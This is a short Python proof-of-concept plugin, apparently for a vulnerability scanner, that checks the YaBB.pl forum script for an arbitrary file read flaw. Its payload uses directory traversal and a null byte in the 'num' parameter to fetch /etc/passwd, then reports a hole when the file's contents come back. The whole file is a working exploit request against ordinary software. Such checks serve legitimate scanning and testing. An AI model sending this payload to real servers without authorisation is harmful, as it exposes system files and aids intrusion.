#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:ko0zhi
"""
POC Name  :	YaBB.pl ?board=news&action=display&num= 任意文件读取漏洞
Reference  :  http://www.beebeeto.com/pdb/poc-2014-0189/
"""


def assign(service,arg):
    if service == "yabb":
        return True,arg
    pass

def audit(arg):
    url = arg
    payload = '/cgi-bin/YaBB.pl?board=news&action=display&num=../../../../../../../../etc/passwd%00'
    verify_url = url +  payload
    code,head,res,errcode, final_url = curl.curl(verify_url)
    if 'root:' in res and 'nobody:' in res:
        security_hole(verify_url)
    pass

if __name__ == "__main__":
    from dummy import *
    audit(assign('yabb', 'http://www.example.com/')[1])